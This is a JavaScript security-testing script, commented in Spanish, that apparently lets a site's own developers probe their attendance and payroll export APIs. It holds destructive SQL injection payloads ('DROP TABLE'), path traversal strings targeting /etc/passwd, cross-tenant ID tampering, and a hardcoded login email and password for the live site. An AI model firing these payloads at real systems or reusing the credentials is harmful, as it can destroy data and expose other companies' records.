#!/usr/bin/env node

/**
 * TEST CON AUTENTICACIÓN REAL
 * Simula usuario autenticado: jorge7gomez@gmail.com
 */

import fetch from 'node-fetch'

const BASE_URL = 'https://humanosisu.net'
const USER_EMAIL = 'jorge7gomez@gmail.com'
const USER_PASSWORD = 'jorge123456'

class AuthenticatedVulnerabilityTester {
  constructor() {
    this.authToken = null
    this.results = []
  }

  // Obtener token de autenticación
  async authenticate() {
    console.log('🔐 Autenticando usuario:', USER_EMAIL)
    
    try {
      // Intentar login con Supabase
      const response = await fetch(`${BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          email: USER_EMAIL,
          password: USER_PASSWORD
        })
      })

      if (response.ok) {
        const data = await response.json()
        this.authToken = data.access_token || data.token
        console.log('✅ Autenticación exitosa')
        return true
      } else {
        console.log('❌ Error en autenticación:', response.status, await response.text())
        return false
      }
    } catch (error) {
      console.log('❌ Error de conexión en autenticación:', error.message)
      return false
    }
  }

  // Test 1: Acceso a datos de otras empresas
  async testCrossCompanyAccess() {
    console.log('🔍 Probando acceso a datos de otras empresas...')
    
    const endpoints = [
      '/api/attendance/export',
      '/api/reports/export-attendance',
      '/api/reports/attendance-trends'
    ]

    for (const endpoint of endpoints) {
      try {
        // Intentar acceder con company_id de otra empresa
        const response = await fetch(`${BASE_URL}${endpoint}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${this.authToken}`
          },
          body: JSON.stringify({
            startDate: '2024-01-01',
            endDate: '2024-01-31',
            formato: 'excel',
            company_id: '00000000-0000-0000-0000-000000000002' // ID de otra empresa
          })
        })

        const responseText = await response.text()
        
        if (response.status === 200) {
          this.results.push({
            type: 'CROSS_COMPANY_ACCESS',
            endpoint,
            severity: 'CRITICAL',
            description: `Acceso a datos de otras empresas en ${endpoint}`,
            details: 'El endpoint devolvió datos sin validar company_id'
          })
        } else if (response.status === 403) {
          console.log(`✅ ${endpoint} - Correctamente protegido contra acceso cross-company`)
        } else {
          console.log(`⚠️ ${endpoint} - Status inesperado: ${response.status}`)
        }
      } catch (error) {
        console.error(`Error en test cross-company para ${endpoint}:`, error.message)
      }
    }
  }

  // Test 2: Inyección SQL con autenticación
  async testSQLInjectionAuthenticated() {
    console.log('🔍 Probando inyección SQL con autenticación...')
    
    const sqlPayloads = [
      "2024-01-01'; DROP TABLE attendance_records; --",
      "2024-01-01' OR '1'='1",
      "2024-01-01' UNION SELECT * FROM user_profiles --",
      "1' OR '1'='1",
      "1'; DROP TABLE attendance_records; --"
    ]

    const endpoints = [
      '/api/attendance/export',
      '/api/reports/export-attendance',
      '/api/reports/attendance-trends'
    ]

    for (const endpoint of endpoints) {
      for (const payload of sqlPayloads) {
        try {
          const response = await fetch(`${BASE_URL}${endpoint}`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${this.authToken}`
            },
            body: JSON.stringify({
              startDate: payload,
              endDate: payload,
              formato: 'excel',
              employee_id: payload
            })
          })

          const responseText = await response.text()
          
          // Verificar si la inyección SQL fue exitosa
          if (responseText.includes('error') || responseText.includes('SQL') || responseText.includes('syntax')) {
            this.results.push({
              type: 'SQL_INJECTION_AUTHENTICATED',
              endpoint,
              payload,
              severity: 'CRITICAL',
              description: `Inyección SQL exitosa en ${endpoint}`,
              details: `Payload: ${payload}`
            })
          } else if (response.status === 400) {
            console.log(`✅ ${endpoint} - Correctamente protegido contra SQL injection`)
          }
        } catch (error) {
          console.error(`Error en test SQL injection para ${endpoint}:`, error.message)
        }
      }
    }
  }

  // Test 3: Bypass de permisos
  async testPermissionBypass() {
    console.log('🔍 Probando bypass de permisos...')
    
    const endpoints = [
      '/api/attendance/export',
      '/api/reports/export-attendance',
      '/api/payroll/export'
    ]

    for (const endpoint of endpoints) {
      try {
        const response = await fetch(`${BASE_URL}${endpoint}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${this.authToken}`
          },
          body: JSON.stringify({
            startDate: '2024-01-01',
            endDate: '2024-01-31',
            formato: 'excel'
          })
        })

        const responseText = await response.text()
        
        if (response.status === 200) {
          console.log(`✅ ${endpoint} - Acceso permitido`)
        } else if (response.status === 403) {
          console.log(`🔒 ${endpoint} - Acceso denegado por permisos insuficientes`)
        } else {
          console.log(`⚠️ ${endpoint} - Status inesperado: ${response.status}`)
        }
      } catch (error) {
        console.error(`Error en test de permisos para ${endpoint}:`, error.message)
      }
    }
  }

  // Test 4: Exposición de información sensible
  async testSensitiveDataExposure() {
    console.log('🔍 Probando exposición de información sensible...')
    
    const endpoints = [
      '/api/attendance/export',
      '/api/reports/export-attendance',
      '/api/reports/attendance-trends'
    ]

    for (const endpoint of endpoints) {
      try {
        const response = await fetch(`${BASE_URL}${endpoint}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${this.authToken}`
          },
          body: JSON.stringify({
            startDate: '2024-01-01',
            endDate: '2024-01-31',
            formato: 'excel'
          })
        })

        const responseText = await response.text()
        
        // Verificar si se expone información sensible
        const sensitivePatterns = [
          /user_id/i,
          /company_id/i,
          /employee_id/i,
          /password/i,
          /token/i,
          /secret/i,
          /key/i,
          /debug/i,
          /error.*stack/i,
          /file.*path/i,
          /database.*connection/i,
          /supabase/i,
          /postgres/i
        ]

        for (const pattern of sensitivePatterns) {
          if (pattern.test(responseText)) {
            this.results.push({
              type: 'SENSITIVE_DATA_EXPOSURE',
              endpoint,
              pattern: pattern.toString(),
              severity: 'HIGH',
              description: `Información sensible expuesta en ${endpoint}`,
              details: `Patrón encontrado: ${pattern.toString()}`
            })
          }
        }
      } catch (error) {
        console.error(`Error en test de exposición de datos para ${endpoint}:`, error.message)
      }
    }
  }

  // Test 5: Path traversal con autenticación
  async testPathTraversalAuthenticated() {
    console.log('🔍 Probando path traversal con autenticación...')
    
    const pathPayloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc//passwd",
      "..%2F..%2F..%2Fetc%2Fpasswd",
      "..%252F..%252F..%252Fetc%252Fpasswd"
    ]

    const endpoints = [
      '/api/attendance/export',
      '/api/reports/export-attendance'
    ]

    for (const endpoint of endpoints) {
      for (const pathPayload of pathPayloads) {
        try {
          const response = await fetch(`${BASE_URL}${endpoint}`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${this.authToken}`
            },
            body: JSON.stringify({
              startDate: '2024-01-01',
              endDate: '2024-01-31',
              formato: 'excel',
              filename: pathPayload
            })
          })

          const responseText = await response.text()
          
          // Verificar si el path traversal fue exitoso
          if (responseText.includes('root:') || responseText.includes('passwd') || responseText.includes('hosts')) {
            this.results.push({
              type: 'PATH_TRAVERSAL_AUTHENTICATED',
              endpoint,
              payload: pathPayload,
              severity: 'CRITICAL',
              description: `Path traversal exitoso en ${endpoint}`,
              details: `Payload: ${pathPayload}`
            })
          }
        } catch (error) {
          console.error(`Error en path traversal para ${endpoint}:`, error.message)
        }
      }
    }
  }

  // Generar reporte
  generateReport() {
    console.log('\n' + '='.repeat(80))
    console.log('📊 REPORTE DE VULNERABILIDADES CON AUTENTICACIÓN')
    console.log('='.repeat(80))
    
    console.log('\n🔴 VULNERABILIDADES ENCONTRADAS:')
    console.log('-'.repeat(50))
    
    if (this.results.length === 0) {
      console.log('✅ No se encontraron vulnerabilidades críticas')
    } else {
      this.results.forEach((vuln, index) => {
        console.log(`${index + 1}. ${vuln.type}`)
        console.log(`   Endpoint: ${vuln.endpoint}`)
        console.log(`   Severidad: ${vuln.severity}`)
        console.log(`   Descripción: ${vuln.description}`)
        if (vuln.details) console.log(`   Detalles: ${vuln.details}`)
        if (vuln.payload) console.log(`   Payload: ${vuln.payload}`)
        console.log('')
      })
    }
    
    console.log('\n🛡️ RECOMENDACIONES:')
    console.log('-'.repeat(50))
    console.log('1. Implementar validación estricta de entrada')
    console.log('2. Aplicar filtros de empresa consistentes')
    console.log('3. Sanitizar nombres de archivo')
    console.log('4. Implementar rate limiting')
    console.log('5. Sanitizar logs y respuestas')
    
    console.log('\n' + '='.repeat(80))
  }

  // Ejecutar todas las pruebas
  async runAllTests() {
    console.log('🚀 Iniciando pruebas de vulnerabilidades con autenticación...')
    
    // Autenticar primero
    const authSuccess = await this.authenticate()
    if (!authSuccess) {
      console.log('❌ No se pudo autenticar. Terminando pruebas.')
      return
    }
    
    // Ejecutar pruebas
    await this.testCrossCompanyAccess()
    await this.testSQLInjectionAuthenticated()
    await this.testPermissionBypass()
    await this.testSensitiveDataExposure()
    await this.testPathTraversalAuthenticated()
    
    // Generar reporte
    this.generateReport()
  }
}

// Ejecutar las pruebas
async function main() {
  const tester = new AuthenticatedVulnerabilityTester()
  await tester.runAllTests()
}

// Ejecutar si es llamado directamente
if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch(console.error)
}

export default AuthenticatedVulnerabilityTester
